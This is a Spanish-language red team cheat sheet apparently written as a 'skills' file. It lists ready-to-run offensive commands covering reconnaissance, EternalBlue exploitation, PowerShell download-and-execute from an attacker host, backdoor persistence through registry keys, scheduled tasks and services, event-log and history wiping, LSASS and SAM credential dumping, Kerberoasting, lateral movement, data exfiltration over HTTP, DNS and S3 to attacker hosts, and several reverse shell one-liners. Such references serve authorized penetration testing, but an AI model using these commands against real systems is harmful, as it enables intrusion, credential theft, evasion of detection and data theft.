# 🔴 RED TEAM SKILLS

## Descripción
Skills para operaciones ofensivas y simulación de adversarios.

---

## Técnicas de Reconocimiento

### Network Scanning
```bash
# Nmap - Escaneo completo
nmap -sC -sV -O -A -p- <target>

# Nmap - Escaneo rápido
nmap -sS -sV --top-ports 1000 <target>

# Masscan - Escaneo masivo
masscan -p1-65535 <target> --rate=1000
```

### DNS Enumeration
```bash
# Subdomain enumeration
subfinder -d <domain> -o subdomains.txt
amass enum -d <domain>

# DNS records
dig <domain> ANY
dnsenum <domain>
```

### Web Reconnaissance
```bash
# Directory bruteforce
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
ffuf -u <url>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Technology detection
whatweb <url>
wappalyzer <url>
```

---

## Técnicas de Acceso Inicial

### Phishing
```bash
# GoPhish - Campaña de phishing
gophish

# King Phisher
king-phisher

# Social Engineering Toolkit
setoolkit
```

### Exploitation
```bash
# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit

# SQLMap
sqlmap -u "<url>?id=1" --dbs
```

---

## Técnicas de Ejecución

### PowerShell
```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1

# Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')

# Encoded command
powershell -enc <base64_command>
```

### Command Line
```bash
# Windows
cmd.exe /c whoami
wmic process call create "cmd.exe /c calc.exe"

# Linux
/bin/bash -c 'id'
python3 -c 'import os; os.system("id")'
```

---

## Técnicas de Persistencia

### Registry Run Keys
```powershell
# Add persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /d "C:\backdoor.exe"

# Atomic Red Team
Invoke-AtomicTest T1547.001
```

### Scheduled Tasks
```powershell
# Create scheduled task
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon

# Atomic Red Team
Invoke-AtomicTest T1053.005
```

### Services
```bash
# Create service
sc create backdoor binpath= "C:\backdoor.exe" start= auto
```

---

## Técnicas de Escalación de Privilegios

### Windows
```powershell
# Check privileges
whoami /priv

# Token manipulation
Invoke-AtomicTest T1134

# UAC Bypass
Invoke-AtomicTest T1548.002
```

### Linux
```bash
# SUID binaries
find / -perm -4000 2>/dev/null

# Sudo misconfigurations
sudo -l

# Kernel exploits
uname -a
searchsploit linux kernel
```

---

## Técnicas de Evasión

### Process Injection
```powershell
# DLL Injection
Invoke-AtomicTest T1055.001

# Process Hollowing
Invoke-AtomicTest T1055.012
```

### Indicator Removal
```powershell
# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear bash history
history -c
rm ~/.bash_history
```

---

## Técnicas de Acceso a Credenciales

### LSASS Dump
```powershell
# Mimikatz
mimikatz.exe "sekurlsa::logonpasswords" exit

# Procdump
procdump.exe -ma lsass.exe lsass.dmp

# Atomic Red Team
Invoke-AtomicTest T1003.001
```

### SAM Database
```powershell
# Registry save
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Secretsdump
secretsdump.py -sam sam.save -system system.save LOCAL
```

### Kerberoasting
```bash
# Impacket
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip> -request

# Rubeus
Rubeus.exe kerberoast
```

---

## Técnicas de Movimiento Lateral

### PsExec
```bash
# Impacket
psexec.py <domain>/<user>:<password>@<target>

# Metasploit
use exploit/windows/smb/psexec
```

### WMI
```powershell
# Remote execution
wmic /node:<target> process call create "cmd.exe /c whoami"

# Impacket
wmiexec.py <domain>/<user>:<password>@<target>
```

### WinRM
```powershell
# PowerShell remoting
Enter-PSSession -ComputerName <target> -Credential <creds>

# Evil-WinRM
evil-winrm -i <target> -u <user> -p <password>
```

### RDP
```bash
# xfreerdp
xfreerdp /u:<user> /p:<password> /v:<target>

# rdesktop
rdesktop -u <user> -p <password> <target>
```

---

## Técnicas de Exfiltración

### HTTP/HTTPS
```bash
# Curl
curl -X POST -d @sensitive.txt http://attacker/exfil

# PowerShell
Invoke-WebRequest -Uri http://attacker/exfil -Method POST -Body (Get-Content file.txt)
```

### DNS
```bash
# DNS exfiltration
cat data.txt | base64 | xargs -I {} dig {}.attacker.com
```

### Cloud Storage
```bash
# AWS S3
aws s3 cp sensitive.txt s3://attacker-bucket/

# Azure Blob
az storage blob upload --file sensitive.txt --container exfil
```

---

## Herramientas Principales

| Herramienta | Propósito |
|-------------|-----------|
| Metasploit | Exploitation framework |
| Cobalt Strike | Adversary simulation |
| Mimikatz | Credential extraction |
| BloodHound | AD attack paths |
| CrackMapExec | Post-exploitation |
| Impacket | Network protocols |
| Responder | LLMNR/NBT-NS poisoning |
| Burp Suite | Web testing |

---

## Comandos Rápidos

```bash
# Reverse shell
bash -i >& /dev/tcp/attacker/4444 0>&1
nc -e /bin/bash attacker 4444
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# File transfer
python3 -m http.server 8080
certutil -urlcache -f http://attacker/file.exe file.exe
wget http://attacker/file -O /tmp/file

# Port forwarding
ssh -L 8080:target:80 user@jumphost
chisel server -p 8080 --reverse
```
